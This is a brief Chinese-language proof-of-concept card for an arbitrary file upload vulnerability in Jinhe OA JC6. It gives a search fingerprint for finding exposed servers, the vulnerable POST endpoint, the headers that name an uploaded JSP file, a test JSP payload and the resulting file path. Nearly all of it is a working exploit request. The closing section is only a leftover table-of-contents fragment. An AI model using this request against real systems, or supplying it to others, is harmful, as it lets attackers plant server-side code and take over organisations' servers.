# 金和OAJC6uploadFileForJinht任意文件上传漏洞

- **系统**：金和OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="JC6金和协同管理平台"`
- **请求**：`POST /jc6/JHSoft.WCF/Attachment/uploadFileForJinht HTTP/1.1`
- **关键头**：`UploadFileName: test.jsp`　`FileSize: 100`　`StartPosition: 0`　`isFromMobilePhone: 1`

**请求体 / payload**
```
<% out.println("test"); %>

上传文件位置
/upload/test.jsp
```

**其他**
- 金和OA JC6 uploadFileForJinht任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞简介
***
- 版本: * 金和OA